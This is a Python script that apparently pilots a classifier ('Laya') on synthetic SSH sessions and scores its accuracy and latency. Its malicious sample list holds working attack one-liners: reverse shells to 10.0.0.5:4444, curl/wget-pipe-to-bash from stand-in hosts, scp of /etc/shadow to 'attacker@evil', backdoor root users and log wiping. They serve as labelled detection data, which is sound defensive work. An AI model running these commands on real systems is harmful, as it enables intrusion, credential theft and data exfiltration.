"""Real Laya inference pilot on synthetic SSH sessions (CPU, pinned revision).

Ground truth labels are assigned by construction: BENIGN_* = 0 (benign), MAL_* = 1 (malicious).
Evidence is written to results/laya_research/real_inference_cpu_pilot.jsonl.

Run with the RAGIN venv python (torch/laya installed there):
    .venv/bin/python scripts/laya_real_inference_pilot.py
"""
from __future__ import annotations

import json
import platform
import statistics
import time
from pathlib import Path

os_env_pre = None
import os

os.environ.setdefault("HF_HUB_OFFLINE", "1")
os.environ.setdefault("TRANSFORMERS_VERBOSITY", "error")

REPO = Path(__file__).resolve().parents[1]
OUT = REPO / "results" / "laya_research" / "real_inference_cpu_pilot.jsonl"
WEIGHTS_SHA = "891102d372688fc2a094dac56a384bc537b87c63f21f9f3dac0be2b7cbc8d86c"
REVISION = "55cf4c4ebb4ebe31b2550e8bdf3bd21b99753851"

BENIGN_SESSIONS = [
    "last login: Fri from 192.168.1.5\ncat /etc/os-release\ndf -h",
    "cd ~/projects/app\ngit status\ngit log --oneline -5",
    "htop\nexit",
    "sudo apt update && sudo apt upgrade -y\nsystemctl status nginx",
    "tar -czf backup.tar.gz ~/docs\nscp backup.tar.gz user@192.168.1.10:/backups/",
    "crontab -e\n0 3 * * * /usr/bin/backup.sh\nexit",
    "docker ps\ndocker logs web-1 --tail 50\nexit",
    "uptime\nwho\nw",
    "vim ~/.bashrc\nalias ll='ls -alF'\nsource ~/.bashrc",
    "ping -c 2 8.8.8.8\nexit",
    "python3 -m venv .venv\nsource .venv/bin/activate\npip install -r requirements.txt",
    "ps aux | grep gunicorn\nsystemctl restart myapp",
    "ls -la /var/www/html\nchown -R www-data:www-data /var/www/html",
    "journalctl -u sshd --since today\nexit",
    "dnf list installed | grep -i kernel\nrpm -qa | wc -l",
    "cat /proc/cpuinfo | head -20\necho 'done'",
    "find /srv/data -name '*.csv' -mtime -7\nexit",
    "mysql -u dbuser -p -e 'SHOW DATABASES;'",
    "curl -I https://example.com\nexit",
    "git clone https://github.com/org/repo.git\ncd repo && make test",
    "systemctl list-units --failed\nsudo dmesg | tail",
    "cd /var/log && ls -lah\nsudo less syslog",
    "iperf3 -s\nexit",
    "df -i\nsudo apt autoremove -y\nexit",
    "kubectl get pods -n staging\nkubectl logs deploy/api --tail=20",
]

MALICIOUS_SESSIONS = [
    "cat /etc/passwd; uname -a; sudo -l",
    "nmap -sS 10.0.0.0/24 -p-",
    "wget http://evil.example.com/x.sh && chmod +x x.sh && ./x.sh",
    "find / -perm -4000 -type f 2>/dev/null",
    "curl -fsSL http://cex.example.com/p.sh | bash",
    "rm -f /var/log/auth.log; history -c",
    "nc -lvnp 4444 -e /bin/bash",
    "ssh -L 2222:127.0.0.1:3306 attacker@relay\nscp /etc/shadow attacker@evil:/a",
    "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"10.0.0.5\",4444)); os.dup2(s.fileno(),0)'",
    "/etc/init.d/iptables stop; iptables -F",
    "useradd -o -u 0 -g 0 backdoor && echo backdoor:Pass123 | chpasswd",
    "grep -rl password /home 2>/dev/null\nls -la /root/.ssh/\ncat /root/.ssh/id_rsa",
    "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys",
    "tar czf /tmp/lost.tgz /etc/shadow /root\nscp /tmp/lost.tgz attacker@evil:/x",
    "at now <<< 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
    "chattr -i /etc/passwd\nsed -i '$ a hack:x:0:0:root:/root:/bin/bash' /etc/passwd",
    "busybox wget http://evil/sh\nchmod 777 sh\n./sh",
    "sqlite3 /var/db/app.db 'SELECT * FROM users;' | nc 10.0.0.9 9999",
    "kill -9 $(pidof rsyslogd)\n> /var/log/wtmp",
    "for u in admin root oracle; do echo -e \"$u:Passw0rd\" | su $u -c id; done",
]

SESSIONS = BENIGN_SESSIONS + MALICIOUS_SESSIONS
LABELS = [0] * len(BENIGN_SESSIONS) + [1] * len(MALICIOUS_SESSIONS)

QUESTIONS = {
    "intent": {
        "type": "choice",
        "instructions": (
            "Classify the primary intent of the SSH session in `session`: "
            "recon, persistence, credential_theft, lateral_movement, exfiltration, "
            "exploitation, cleanup, benign_administration"
        ),
        "criteria": {
            "recon": "probing, scanning or discovery activity",
            "persistence": "implanting a persistent foothold",
            "credential_theft": "harvesting credentials or key material",
            "lateral_movement": "pivoting to other hosts",
            "exfiltration": "copying data out of the host",
            "exploitation": "running exploits or shellcode to compromise the host",
            "cleanup": "erasing evidence",
            "benign_administration": "ordinary administrative work",
        },
    },
    "malicious": {
        "type": "noul",
        "instructions": "Is `session` malicious?",
    },
    "severity": {
        "type": "score",
        "instructions": "How dangerous is `session`?",
        "criteria": ["none", "low", "moderate", "high"],
    },
}


def rss_kb() -> int:
    with open("/proc/self/status") as f:
        for line in f:
            if line.startswith("VmRSS"):
                return int(line.split()[1])
    return -1


def main() -> None:
    import torch  # local: heavy import after env is set
    import laya
    from laya import Router

    print("laya", laya.__version__, "| torch", torch.__version__, "| python", platform.python_version())

    t0 = time.perf_counter()
    router = Router(device="cpu", revisions={"english": REVISION}, max_loaded=1)
    warm = router.predict(state={"session": SESSIONS[0]}, questions=QUESTIONS, model="english")
    route_and_load_ms = (time.perf_counter() - t0) * 1000.0
    print("first prediction (route+load+infer) ms:", round(route_and_load_ms, 1))
    print("warm-up answers:", json.dumps(warm["answers"], default=str)[:500])

    rss_after_load = rss_kb()
    print("RSS KB after load:", rss_after_after := rss_after_load)

    latencies = []
    records = []
    t_start = time.perf_counter()
    for i, (txt, y) in enumerate(zip(SESSIONS, LABELS)):
        t0 = time.perf_counter()
        res = router.predict(state={"session": txt}, questions=QUESTIONS, model="english")
        lat_ms = (time.perf_counter() - t0) * 1000.0
        latencies.append(lat_ms)
        a = res["answers"]
        # noul semantics (laya 0.4.2, agent.py): answers[qid]["noul"] = p[1] = P(answer true)
        p_val = a["malicious"].get("noul")
        intent = a["intent"].get("choice")
        sev = a["severity"].get("choice", a["severity"].get("legend"))
        rec = {
            "i": i,
            "y": y,
            "intent": intent,
            "p_true": p_val,
            "severity": sev,
            "latency_ms": lat_ms,
            "answers_raw": {k: (dict(list(v.items())[:4]) if isinstance(v, dict) else v) for k, v in a.items()},
        }
        records.append(rec)
    total_s = time.perf_counter() - t_start
    print("total inference time s:", round(total_s, 1))

    lat_sorted = sorted(latencies)
    summary = {
        "n": len(latencies),
        "mean_ms": statistics.mean(latencies),
        "p50_ms": statistics.median(latencies),
        "p95_ms": lat_sorted[int(len(lat_sorted) * 0.95) - 1],
        "min_ms": min(latencies),
        "max_ms": max(latencies),
        "route_load_ms": route_and_load_ms,
        "rss_kb_after_load": rss_after_load,
    }
    print("latency summary:", json.dumps(summary))

    def as_prob(p):
        if isinstance(p, bool):
            return 1.0 if p else 0.0
        if isinstance(p, (int, float)):
            return float(p)
        if isinstance(p, str):
            s = p.strip().lower()
            if s in ("true", "false"):
                return 1.0 if s == "true" else 0.0
            try:
                return float(s)
            except ValueError:
                return None
        return None

    THRESH = 0.5
    tp = fp = tn = fn = abstain = 0
    brier_terms = []
    for rec in records:
        p = as_prob(rec["p_true"])
        if p is None:
            abstain += 1
            rec["pred"] = None
            continue
        rec["pred"] = 1 if p > THRESH else 0
        if rec["pred"] == rec["y"]:
            if rec["y"] == 1:
                tp += 1
            else:
                tn += 1
        else:
            if rec["y"] == 1:
                fn += 1
            else:
                fp += 1
        brier_terms.append((p - rec["y"]) ** 2)
    n_scored = tp + fp + tn + fn
    metrics = {
        "tp": tp, "fp": fp, "tn": tn, "fn": fn, "abstain": abstain,
        "accuracy": (tp + tn) / n_scored if n_scored else None,
        "precision": tp / (tp + fp) if (tp + fp) else None,
        "recall": tp / (tp + fn) if (tp + fn) else None,
        "brier": sum(brier_terms) / len(brier_terms) if brier_terms else None,
    }
    print("metrics:", json.dumps(metrics))

    OUT.parent.mkdir(parents=True, exist_ok=True)
    out = {
        "summary": summary,
        "metrics": metrics,
        "records": records,
        "weights_sha256": WEIGHTS_SHA,
        "revision": REVISION,
        "laya_version": laya.__version__,
        "torch": torch.__version__,
        "python": platform.python_version(),
        "device": "cpu",
    }
    with open(OUT, "w") as f:
        json.dump(out, f, indent=1, default=str)
    print("saved:", OUT)


if __name__ == "__main__":
    main()
